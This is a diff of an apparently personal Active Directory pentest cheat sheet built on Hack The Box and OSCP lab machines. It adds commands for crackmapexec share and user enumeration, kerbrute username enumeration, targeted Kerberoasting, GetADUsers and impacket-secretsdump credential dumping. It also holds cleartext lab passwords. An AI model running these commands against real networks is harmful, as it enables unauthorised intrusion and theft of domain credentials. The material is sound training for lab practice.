@@ -4,17 +4,6 @@
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
 
-#crackmapexec(smb/winrm)
-crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
-crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
-
-
-# rdesktop
-rdesktop 192.168.216.165
-
-
 # smbclient
 ## anon
 smbclient -L 10.10.10.175 -N
@@ -24,6 +13,18 @@ smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.
 > recurse on
 > prompt off
 > ls
+
+#crackmapexec(smb/winrm)
+crackmapexec smb 10.10.10.10 -u '' -p '' --shares
+crackmapexec smb 10.10.10.10 -u '' -p '' --users
+crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local --shares
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
+crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
+
+# rdesktop
+rdesktop 192.168.216.165
 
 
 # dns
@@ -57,6 +58,7 @@ ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
 
 # kerbrute
 ## anon
+./kerbrute userenum --dc 10.10.x.x -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 kerbrute.py -users ./users.txt -dc-ip 192.168.10.175 -domain oscp.exam
 
 
@@ -94,6 +96,15 @@ hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/sha
 
 # bloodhound
 bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+
+# impacket-getadusers
+impacket-getadusers.py -all -dc-ip 10.10.10.100 active.htb\svc_tags
+
+# targeted kerberoast
+python3 ./targetedKerberoast.py -d 'htb.local' -u 'svc-alfresco' -p 's3rvice'
+
+# impacket-secretsdump
+impacket-secretsdump htb.local/EDISC:'Password123'@10.10.10.161
 ```
 
 
